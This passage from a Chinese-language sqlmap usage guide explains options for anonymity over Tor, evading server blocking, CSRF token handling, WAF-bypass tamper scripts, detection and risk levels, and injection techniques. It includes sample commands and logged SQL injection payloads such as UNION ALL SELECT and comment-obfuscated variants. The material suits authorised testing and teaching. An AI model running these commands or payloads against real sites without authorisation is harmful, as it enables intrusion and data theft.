<p>如果要求高度的匿名性可以使用参数“–check-tor”，加上该参数后Sqlmap会确保所有流量都走Tor代理，若Tor代理失效，Sqlmap会发出警告并退出。检测方法是访问Are you using Tor?。</p>
<h3 id="14-HTTP请求之间添加延迟"><a href="#14-HTTP请求之间添加延迟" class="headerlink" title="14.HTTP请求之间添加延迟"></a>14.HTTP请求之间添加延迟</h3><p>参数：–delay</p>
<p>过于频繁地发送请求可能会被网站察觉或有其他不良后果。使用参数“–delay”来指定HTTP请求之间的延迟，单位为秒，类型是浮点数，如“–delay 1.5”表示延迟1.5秒。默认是没有延迟的。</p>
<h3 id="15-超时"><a href="#15-超时" class="headerlink" title="15.超时"></a>15.超时</h3><p>参数：–timeout</p>
<p>超时时间默认为30秒，可以用参数“–timeout”指定超时时间，如“–timeout 44.5”表示设置超时时间为44.5秒。</p>
<h3 id="16-超时后最大重试次数"><a href="#16-超时后最大重试次数" class="headerlink" title="16.超时后最大重试次数"></a>16.超时后最大重试次数</h3><p>参数：–retries</p>
<p>超时后Sqlmap会进行重试，最大重试次数默认为3，可以用参数“–retries”指定最大重试次数。</p>
<h3 id="17-随机化参数值"><a href="#17-随机化参数值" class="headerlink" title="17.随机化参数值"></a>17.随机化参数值</h3><p>参数：–randomize</p>
<p>使用该参数，Sqlmap会随机生成每次HTTP请求中参数的值，值的类型和长度依照于原始值。</p>
<h3 id="18-用正则表达式过滤代理日志"><a href="#18-用正则表达式过滤代理日志" class="headerlink" title="18.用正则表达式过滤代理日志"></a>18.用正则表达式过滤代理日志</h3><p>参数：–scope</p>
<p>指定一个Python正则表达式对代理日志进行过滤，只测试符合正则表达式的目标，如：</p>
<p><code>python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</code></p>
<h3 id="19-避免错误请求过多而被屏蔽"><a href="#19-避免错误请求过多而被屏蔽" class="headerlink" title="19.避免错误请求过多而被屏蔽"></a>19.避免错误请求过多而被屏蔽</h3><p>参数：–safe-url、–safe-post、–safe-req和–safe-freq</p>
<p>有时服务器检测到某个客户端错误请求过多会对其进行屏蔽，而Sqlmap的测试往往会产生大量错误请求，为避免被屏蔽，可以时不时的产生几个正常请求以迷惑服务器。有以下四个参数与这一机制有关：</p>
<p>–safe-url: 隔一会就访问一下的安全URL<br>–safe-post: 访问安全URL时携带的POST数据<br>–safe-req: 从文件中载入安全HTTP请求<br>–safe-freq: 每次测试请求之后都会访问一下的安全URL  </p>
<p>这里所谓的安全URL是指访问会返回200、没有任何报错的URL。相应地，Sqlmap也不会对安全URL进行任何注入测试。</p>
<h3 id="20-关闭URL编码"><a href="#20-关闭URL编码" class="headerlink" title="20.关闭URL编码"></a>20.关闭URL编码</h3><p>参数：–skip-urlencode</p>
<p>Sqlmap默认会对URL进行URL编码，可以使用该参数关闭URL编码。</p>
<h3 id="21-绕过CSRF保护"><a href="#21-绕过CSRF保护" class="headerlink" title="21.绕过CSRF保护"></a>21.绕过CSRF保护</h3><p>参数：–csrf-token和–csrf-url</p>
<p>现在有很多网站通过在表单中添加值为随机生成的token的隐藏字段来防止CSRF攻击，Sqlmap会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。</p>
<p>“–csrf-token”用于指定包含token的隐藏字段名，若这个字段名不是常见的防止CSRF攻击的字段名Sqlmap可能不能自动识别出，需要手动指定。如Django中该字段名为“csrfmiddlewaretoken”，明显与CSRF攻击有关。</p>
<p>“–csrf-url”用于从任意的URL中回收token值。若最初有漏洞的目标URL中没有包含token值而又要求在其他地址提取token值时该参数就很有用。</p>
<h3 id="22-强制使用SSL"><a href="#22-强制使用SSL" class="headerlink" title="22.强制使用SSL"></a>22.强制使用SSL</h3><p>参数：–force-ssl</p>
<h3 id="23-在每次请求前执行特定Python代码"><a href="#23-在每次请求前执行特定Python代码" class="headerlink" title="23.在每次请求前执行特定Python代码"></a>23.在每次请求前执行特定Python代码</h3><p>参数：–eval</p>
<p>直接看例子：</p>
<p><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></p>
<p>每次返送请求前，Sqlmap都会依据id值重新计算hash值并更新GET请求中的hash值。</p>
<h2 id="六、优化"><a href="#六、优化" class="headerlink" title="六、优化"></a>六、优化</h2><p>这些参数可以优化Sqlmap的性能。</p>
<h3 id="1-一键优化"><a href="#1-一键优化" class="headerlink" title="1.一键优化"></a>1.一键优化</h3><p>参数：-o</p>
<p>添加此参数相当于同时添加下列三个优化参数：</p>
<p>–keep-alive –null-connection –threads=3 （如果没有设置一个更好的值）</p>
<p>这些参数具体含义见后文。</p>
<h3 id="2-HTTP长连接"><a href="#2-HTTP长连接" class="headerlink" title="2.HTTP长连接"></a>2.HTTP长连接</h3><p>参数：–keep-alive</p>
<p>该参数让Sqlmap使用HTTP长连接。该参数与“–proxy”矛盾。</p>
<h3 id="3-HTTP空连接"><a href="#3-HTTP空连接" class="headerlink" title="3.HTTP空连接"></a>3.HTTP空连接</h3><p>参数：–null-connection</p>
<p>有一种特殊的HTTP请求类型可以直接获得HTTP响应的大小而不用获得HTTP响应体。显然这在布尔型盲注中可以节约很大的带宽。当然这一技术是需要服务器端支持的。该参数与“–text-only”矛盾。</p>
<h3 id="4-HTTP并发"><a href="#4-HTTP并发" class="headerlink" title="4.HTTP并发"></a>4.HTTP并发</h3><p>参数：–threads</p>
<p>使用该参数指定Sqlmap可以达到的最大并发数。从性能和网站承受能力两方面考虑最大并发数不要超过10。</p>
<h2 id="七、注入"><a href="#七、注入" class="headerlink" title="七、注入"></a>七、注入</h2><p>这些参数被用于指定要测试的参数、定制攻击荷载和选择篡改脚本。</p>
<h3 id="1-要测试的注入点"><a href="#1-要测试的注入点" class="headerlink" title="1.要测试的注入点"></a>1.要测试的注入点</h3><p>参数：-p和–skip</p>
<p>默认情况下Sqlmap会测试所有GET参数和POST参数，当level大于等于2时会测试cookie参数，当level大于等于3时会测试User-Agent和Referer。实际上还可以手动指定一个以逗号分隔的、要测试的参数列表，该列表中的参数不受level限制。这就是“-p”的作用。</p>
<p>举个例子，若想只测试GET参数“id”和User-Agent，则可以这么写：</p>
<p><code>-p &quot;id,user-agent&quot;</code></p>
<p>如果不想测试某一参数则可以使用“–skip”。如设置了level为5但不想测试User-Agent和Referer，则可以这么写：</p>
<p><code>--level=5 --skip=&quot;user-agent,referer&quot;</code></p>
<p>有时会遇到伪静态网页。动态网页会明目张胆地列出参数，如：</p>
<p><code>/user.php?id=1</code></p>
<p>显然参数是id，值为1。但若是伪静态网页则可能这样写：</p>
<p><code>/user/1/</code></p>
<p>将参数隐藏在URL中。通常情况下Sqlmap不会对这样的伪静态网页的参数做测试，因为Sqlmap无法判断哪个是参数。若想要对这样的伪静态进行测试，只需要加上“*”，告诉Sqlmap哪个是伪静态参数就行，剩下事的和GET参数没有什么区别。如：</p>
<p><code>python sqlmap.py -u &quot;http(s)://target.cc/user/1*/&quot;</code></p>
<h3 id="2-指定数据库管理系统"><a href="#2-指定数据库管理系统" class="headerlink" title="2.指定数据库管理系统"></a>2.指定数据库管理系统</h3><p>参数：–dbms</p>
<p>dbms是“Database Management System”的缩写。默认情况下Sqlmap会自动检测网站使用的数据库管理系统，Sqlmap支持以下这些数据库管理系统：</p>
<ul>
<li>MySQL</li>
<li>Oracle</li>
<li>PostgreSQL</li>
<li>Microsoft SQL Server</li>
<li>Microsoft Access</li>
<li>Firebird</li>
<li>SQLite</li>
<li>Sybase</li>
<li>SAP MaxDB</li>
<li>DB2  </li>
</ul>
<p>如果Sqlmap自动检测失败或是不想让Sqlmap进行数据库指纹检测，可以使用参数“–dbms”手动指定数据库管理系统，如：“–dbms postgresql”。</p>
<p>对于Mysql和Microsoft SQL Server和要这样指定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--dbms MySQL &lt;version&gt;</span><br><span class="line">--dbms Microsoft SQL Server &lt;version&gt;</span><br></pre></td></tr></table></figure>

<p>对于MySQL来说，是类似这样的：5.0。对于Microsoft SQL Server来说，是类似这样的：2005。</p>
<p>如果在添加“–dbms”参数的同时还添加了“–fingerprint”，Sqlmap只会在指定的数据库管理系统内进行指纹识别。</p>
<p>只有在很确定时使用“–dbms”，否则还是让Sqlmap自动检测更好些。</p>
<h3 id="3-指定运行数据库管理系统的操作系统"><a href="#3-指定运行数据库管理系统的操作系统" class="headerlink" title="3.指定运行数据库管理系统的操作系统"></a>3.指定运行数据库管理系统的操作系统</h3><p>参数：–os</p>
<p>默认情况下Sqlmap会自动检测运行数据库管理系统的操作系统，目前完全支持的操作系统有：</p>
<ul>
<li>Linux</li>
<li>Windows</li>
</ul>
<p>如果很确定可以使用参数“–os”指定运行数据库管理系统的操作系统。当然在只用很确定时才应该使用此参数，否则还是让Sqlmap自动检测更好些。</p>
<h3 id="4-生成无效参数值时强制使用大数"><a href="#4-生成无效参数值时强制使用大数" class="headerlink" title="4.生成无效参数值时强制使用大数"></a>4.生成无效参数值时强制使用大数</h3><p>参数：–invalid-bignum</p>
<p>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-bignum”，Sqlmap就会取大数（如：id=99999999）作为无效参数。</p>
<h3 id="5-生成无效参数值时强制使用逻辑操作符"><a href="#5-生成无效参数值时强制使用逻辑操作符" class="headerlink" title="5.生成无效参数值时强制使用逻辑操作符"></a>5.生成无效参数值时强制使用逻辑操作符</h3><p>参数：–invalid-logical</p>
<p>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用逻辑操作符（如：id=13 AND 18=19）作为无效参数。</p>
<h3 id="6-生成无效参数值时强制使用字符串"><a href="#6-生成无效参数值时强制使用字符串" class="headerlink" title="6.生成无效参数值时强制使用字符串"></a>6.生成无效参数值时强制使用字符串</h3><p>参数：–invalid-string</p>
<p>有时在注入测试时需要生成无效参数，一般情况下Sqlmap会取已有参数（如：id=13）的相反数（如：id=-13）作为无效参数。但若添加“–invalid-logical”，Sqlmap就会使用字符串（如：id=akewmc）作为无效参数。</p>
<h3 id="7-关闭payload转换"><a href="#7-关闭payload转换" class="headerlink" title="7.关闭payload转换"></a>7.关闭payload转换</h3><p>参数：–no-cast</p>
<p>在检索结果时Sqlmap会将所有输入转换为字符串类型，若遇到空值（NULL）则将其替换为空白字符。<br>这样做是为了防止如连接空值和字符串之类的任何错误发生并可以简化数据检索过程。<br>但是有报告显示在老版本的Mysql中这样做会导致数据检索出现问题，因此添加了“–no-cast”来告诉Sqlmap不要这样做。</p>
<h3 id="8-关闭字符串编码"><a href="#8-关闭字符串编码" class="headerlink" title="8.关闭字符串编码"></a>8.关闭字符串编码</h3><p>参数：–no-escape</p>
<p>有时Sqlmap会使用用单引号括起来的字符串值作为payload，如“SELECT ‘foobar’”，默认地这些值会被编码，如上例将被编码为：<br>“SELECT CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))”。这样做既可以混淆视听让人一时难以洞察payload的内容又可以在后台服务器使用类似magic_quote或mysql_real_escape_string这样的转义函数的情况下字符串不受影响。当然在某些情况下需要关闭字符串编码，如为了缩减payload长度，用户可以使用“–no-escape”来关闭字符串编码。</p>
<h3 id="9-定制payload"><a href="#9-定制payload" class="headerlink" title="9.定制payload"></a>9.定制payload</h3><p>参数：–prefix和–suffix</p>
<p>有时只有在payload后添加用户指定的后缀才能注入成功。另一种场景是用户已经知道查询语句怎么写的，此时可以直接指定payload的前缀和后缀来完成检测和注入。</p>
<p>一个有漏洞的源码示例如下：</p>
<p><code>query = &quot;SELECT * FROM users WHERE id=(&#39;&quot; . $\_GET[&#39;id&#39;] . &quot;&#39;) LIMIT 0, 1&quot;;</code></p>
<p>对这样的例子可以让Sqlmap自动检测边界范围也可以手动指出边界范围：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;</code><br>最终SQL语句会变成：</p>
<p><code>SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1</code></p>
<p>这个句子语法是正确的，payload也能执行。</p>
<p>在简单的测试环境下Sqlmap不需要被提供定制的边界范围就能够自动检测并完成注入，但在真实世界中某些应用可能会很复杂如嵌套JOIN查询，此时就需要为Sqlmap指明边界范围。</p>
<h3 id="10-修改注入数据"><a href="#10-修改注入数据" class="headerlink" title="10.修改注入数据"></a>10.修改注入数据</h3><p>参数：–tamper</p>
<p>除了用CHAR()编码字符串外Sqlmap没有对payload进行任何混淆。<br>该参数用于对payload进行混淆以绕过IPS或WAF。<br>该参数后跟一个tamper脚本的名字。<br>若该tamper脚本位于sqlmap的安装目录的tamper/目录中，就可以省略路径和后缀名，只写文件名。<br>多个tamper脚本之间用空格隔开。</p>
<p>在tamper/目录中有许多可用的tamper脚本。tamper脚本的作用是对payload进行混淆。<br>我们还可以自己写tamper脚本，这属于Sqlmap的高级用法，一个有效的tamper脚本如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 必须要导入的库</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"># 定义该tamper脚本的优先级</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line">def tamper(payload):</span><br><span class="line">  &apos;&apos;&apos;此处是tamper的说明&apos;&apos;&apos;</span><br><span class="line">  retVal = payload</span><br><span class="line">  # 此处是用于修改payload的代码</span><br><span class="line">  # 返回修改后的payload</span><br><span class="line">  return retVal</span><br></pre></td></tr></table></figure>

<p>下面是一个示例，该示例的目标是Mysql，假定大于号、空格和开头的SELECT是被禁止的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.56.101:8080/ScorePrj/?id=1&quot; \</span><br><span class="line">--tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3</span><br></pre></td></tr></table></figure>

<p>该示例部分输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[12:55:52] [DEBUG] cleaning up configuration parameters</span><br><span class="line">[12:55:52] [INFO] loading tamper script &apos;between&apos;</span><br><span class="line">[12:55:52] [INFO] loading tamper script &apos;randomcase&apos;</span><br><span class="line">[12:55:52] [INFO] loading tamper script &apos;space2comment&apos;</span><br><span class="line">[...]</span><br><span class="line">[12:55:53] [INFO] testing for SQL injection on GET parameter &apos;id&apos;</span><br><span class="line">[12:55:53] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[12:55:53] [PAYLOAD] 1</span><br><span class="line">[12:55:53] [PAYLOAD] 1)/**/aNd/**/8083=4737/**/aNd/**/(4754/**/BetwEen/**/4754/**/aNd/**/4754</span><br><span class="line">[12:55:53] [PAYLOAD] 1)/**/anD/**/4962=4962/**/anD/**/(2361/**/BeTweEN/**/2361/**/anD/**/2361</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/aNd/**/9754/**/BETwEEn/**/1206/**/aNd/**/1206</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/AnD/**/4962/**/beTweEn/**/4962/**/AnD/**/4962</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/aND/**/2741/**/BetWeEn/**/9323/**/aND/**/9323--/**/Ihsa</span><br><span class="line">[12:55:53] [PAYLOAD] 1/**/anD/**/4962/**/BetweEN/**/4962/**/anD/**/4962--/**/wVUI</span><br><span class="line">[12:55:53] [PAYLOAD] 1&apos;)/**/anD/**/1694=6061/**/anD/**/(&apos;zLwu&apos;=&apos;zLwu</span><br><span class="line">[12:55:53] [PAYLOAD] 1&apos;)/**/ANd/**/4962=4962/**/ANd/**/(&apos;Dsfw&apos;=&apos;Dsfw</span><br><span class="line">[12:55:53] [PAYLOAD] 1&apos;/**/aND/**/6307=8901/**/aND/**/&apos;fKLn&apos;=&apos;fKLn</span><br><span class="line">[12:55:53] [PAYLOAD] 1&apos;/**/aNd/**/4962=4962/**/aNd/**/&apos;YFsp&apos;=&apos;YFsp</span><br><span class="line">[12:55:53] [PAYLOAD] 1%&apos;/**/anD/**/3549=6854/**/anD/**/&apos;%&apos;=&apos;</span><br><span class="line">[12:55:53] [PAYLOAD] 1%&apos;/**/aND/**/4962=4962/**/aND/**/&apos;%&apos;=&apos;</span><br><span class="line">[...]</span><br><span class="line">[12:55:54] [PAYLOAD] 1)/**/uNIoN/**/alL/**/Select/**/nuLl--/**/NRtq</span><br><span class="line">[12:55:54] [PAYLOAD] 1)/**/UnIOn/**/alL/**/sElEcT/**/nuLL,nuLL--/**/jalk</span><br><span class="line">[12:55:54] [PAYLOAD] 1)/**/Union/**/aLl/**/seLeCt/**/nuLL,nuLL,nuLL--/**/ylpg</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>而若不加tamper脚本，上例的部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">  [13:00:12] [INFO] testing for SQL injection on GET parameter &apos;id&apos;</span><br><span class="line">  [13:00:12] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) AND 9902=5632 AND (5820=5820</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) AND 6711=6711 AND (7174=7174</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 7140=6136</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 6711=6711</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 1693=7532-- oqcR</span><br><span class="line">  [13:00:12] [PAYLOAD] 1 AND 6711=6711-- qAPJ</span><br><span class="line">  [13:00:12] [PAYLOAD] 1&apos;) AND 6904=7395 AND (&apos;xBlu&apos;=&apos;xBlu</span><br><span class="line">  [13:00:12] [PAYLOAD] 1&apos;) AND 6711=6711 AND (&apos;RgoX&apos;=&apos;RgoX</span><br><span class="line">  [13:00:12] [PAYLOAD] 1&apos; AND 6469=7302 AND &apos;maCj&apos;=&apos;maCj</span><br><span class="line">  [13:00:12] [PAYLOAD] 1&apos; AND 6711=6711 AND &apos;pSYg&apos;=&apos;pSYg</span><br><span class="line">  [13:00:12] [PAYLOAD] 1%&apos; AND 7516=3605 AND &apos;%&apos;=&apos;</span><br><span class="line">  [13:00:12] [PAYLOAD] 1%&apos; AND 6711=6711 AND &apos;%&apos;=&apos;</span><br><span class="line">  [...]</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL-- mUDh</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL-- QKId</span><br><span class="line">  [13:00:12] [PAYLOAD] 1) UNION ALL SELECT NULL,NULL,NULL-- iwvT</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure>

<h2 id="八、检测"><a href="#八、检测" class="headerlink" title="八、检测"></a>八、检测</h2><h3 id="1-检测级别"><a href="#1-检测级别" class="headerlink" title="1.检测级别"></a>1.检测级别</h3><p>参数：–level</p>
<p>此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。<br>Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;test&gt;</span><br><span class="line">    &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&lt;/title&gt;</span><br><span class="line">    &lt;stype&gt;1&lt;/stype&gt;</span><br><span class="line">    &lt;level&gt;2&lt;/level&gt;</span><br><span class="line">    &lt;risk&gt;1&lt;/risk&gt;</span><br><span class="line">    &lt;clause&gt;1&lt;/clause&gt;</span><br><span class="line">    &lt;where&gt;1&lt;/where&gt;</span><br><span class="line">    &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt;</span><br><span class="line">    &lt;request&gt;</span><br><span class="line">        &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt;</span><br><span class="line">        &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;/comment&gt;</span><br><span class="line">    &lt;/request&gt;</span><br><span class="line">    &lt;response&gt;</span><br><span class="line">        &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt;</span><br><span class="line">    &lt;/response&gt;</span><br><span class="line">&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。<br>risk标签的含义见后文。</p>
<p>检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的，<br>检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。</p>
<p>若不是很清楚注入点在哪里可以设置一个比较高的检测级别。</p>
<p>强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。</p>
<h3 id="2-风险等级"><a href="#2-风险等级" class="headerlink" title="2.风险等级"></a>2.风险等级</h3><p>参数：–risk</p>
<p>此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。<br>风险等级2添加了基于时间的注入测试，等级3添加了OR测试。</p>
<p>若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。<br>因此用户需要能控制风险等级避开有潜在风险的payload。</p>
<h3 id="3-页面对比"><a href="#3-页面对比" class="headerlink" title="3.页面对比"></a>3.页面对比</h3><p>参数：–string、–not-string、–regexp</p>
<p>默认情况下在布尔型注入中Sqlmap通过比较返回页面内容来判断True或False。<br>但有时页面每次刷新都会不同，如页面中有动态广告。Sqlmap会尽力判断出页面中动态的部分来，但并不总能成功。<br>用户可以用参数“–string”指出代表True的页面会包含而代表False的页面不会包含的字符串以供Sqlmap判断True或False，<br>若这样的字符串是变动的还可以用参数“–regexp”指定一个正则表达式去匹配这样的字符串。<br>或者用参数“–not-string”指出代表False的页面会包含而代表True的页面不会包含的字符串。</p>
<p>参数：–code</p>
<p>或者更简单地，若是用户知道代表True的页面HTTP状态码为200而代表False的页面HTTP状态码不为200比如是401，<br>可以用“–code”参数告诉告诉Sqlmap这一信息，如“–code=200”。</p>
<p>参数：–titles</p>
<p>若是用户知道代表True的页面title和代表False的页面title不同，<br>如代表True的页面title为“Welcome”，代表False的页面title为“Forbidden”，<br>就可以使用参数“–titles”让Sqlmap依据title来判断True或False。</p>
<p>参数：–text-only</p>
<p>若是HTTP响应体中有许多诸如JavaScript之类的活动内容，可以使用参数“–text-only”让Sqlmap只专注于纯文本内容。</p>
<h2 id="九、注入技术"><a href="#九、注入技术" class="headerlink" title="九、注入技术"></a>九、注入技术</h2><p>这些参数用于对特定的SQL注入技术进行调整。</p>
<h3 id="1-检测时所用技术"><a href="#1-检测时所用技术" class="headerlink" title="1.检测时所用技术"></a>1.检测时所用技术</h3><p>参数：–technique</p>
<p>此参数用于指定检测注入时所用技术。默认情况下Sqlmap会使用自己支持的全部技术进行检测。 </p>
<p>此参数后跟表示检测技术的大写字母，其值为B、E、U、S、T或Q，含义如下：</p>
<ul>
<li>B：Boolean-based blind（布尔型注入），即可以根据返回页面判断条件真假的注入。</li>
<li>E：Error-based（基于报错注入)，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li>
<li>U：Union query-based（联合查询注入）可以使用union的情况下的注入。</li>
<li>S：Stacked queries（堆查询注入）可以同时执行多条语句的执行时的注入。</li>
<li>T：Time-based blind（基于时间延迟注入）即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>Q：Inline queries（嵌套查询注入）。</li>
</ul>
<p>可以用“–technique ES”来指定使用两种检测技术。“–technique BEUSTQ”与默认情况等效。</p>
<p>想要访问文件系统或是Windows的注册表就一定要添加“S”进行多语句查询注入测试。</p>
<h3 id="2-基于时间延迟注入中延时设置"><a href="#2-基于时间延迟注入中延时设置" class="headerlink" title="2.基于时间延迟注入中延时设置"></a>2.基于时间延迟注入中延时设置</h3><p>参数：–time-sec</p>
<p>用此参数设置基于时间延迟注入中延时时长，默认为5秒。</p>
<h3 id="3-联合查询注入中列数设置"><a href="#3-联合查询注入中列数设置" class="headerlink" title="3.联合查询注入中列数设置"></a>3.联合查询注入中列数设置</h3><p>参数：–union-cols</p>
<p>在进行联合查询注入时，Sqlmap会自动检测列数，范围是1到10。当level值较高时列数检测范围的上限会扩大到50。</p>
<p>可以用此参数指定列数检测范围，如“–union-cols 12-16”就会让Sqlmap的列数检测范围变成12到16。</p>
<h3 id="4-联合查询注入中字符设置"><a href="#4-联合查询注入中字符设置" class="headerlink" title="4.联合查询注入中字符设置"></a>4.联合查询注入中字符设置</h3><p>参数：–union-char</p>
<p>默认情况下Sqlmap进行联合查询注入时使用空字符（NULL）。但当level值较高时Sqlmap会生成随机数用于联合查询注入。<br>因为有时使用空字符注入会失败而使用随机数会成功。</p>
<p>使用此参数可以指定联合查询注入中使用的字符，如：“–union-char 123”。</p>
<p>“联合查询注入中使用的字符”究竟是什么意思呢？请看下面两个例子：</p>
<p>第一个例子，不使用“–union-char”，默认情况下联合查询注入中使用的字符为空字符（NULL）：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.101/user.php?id=001&quot; --technique U -v 3</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,CONCAT(0x71707a6271,0x66546c7770497458576f6455476761654654745744684c5062585971794c556d55454a6c49525675,0x7162767671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FAcV</span><br><span class="line">[10:59:15] [PAYLOAD] 001 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71707a6271,0x6b43674e76687959526b6452627255787373675a6f5a436f7266756d49424547496d506779456170,0x7162767671),NULL,NULL,NULL,NULL,NULL-- caXD</span><br></pre></td></tr></table></figure>

<p>第一个例子，使用“–union-char 123”，指定联合查询注入中使用的字符为“123”：</p>
<p><code>python sqlmap.py -u &quot;http://192.168.56.101/user.php?id=001&quot; --technique U -v 3 --union-char 123</code></p>
<p>部分输出为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x776c71686e54726659424b49616d68756e64734d45774c4c7163494345794255784557597a484244,0x7178627071)-- aUXO</span><br><span class="line">[10:59:30] [PAYLOAD] 001 UNION ALL SELECT 123,123,123,123,123,123,123,123,123,123,CONCAT(0x716b707171,0x6f5278444767675156496c724563714e6568634c6b5950646a6f4e53516b776d77474e7141425273,0x7178627071),123-- lPHb</span><br></pre></td></tr></table></figure>

<p>仔细观察上示两例的输出就能明白“联合查询注入中使用的字符”就是“UNION ALL SELECT XXX, XXX”中的“XXX”。</p>
<h3 id="5-联合查询注入中表名设置"><a href="#5-联合查询注入中表名设置" class="headerlink" title="5.联合查询注入中表名设置"></a>5.联合查询注入中表名设置</h3><p>参数：–union-from</p>
<p>有些情况下在联合查询中必须指定一个有效和可访问的表名，否则联合查询会执行失败，如在微软的Access中。<br>（也就是说，某些DBMS不支持“SELECT 1,2;”这样的语句，SELECT必须有FROM。）<br>用此参数指定这个表名，如：“–union-from=users”。</p>
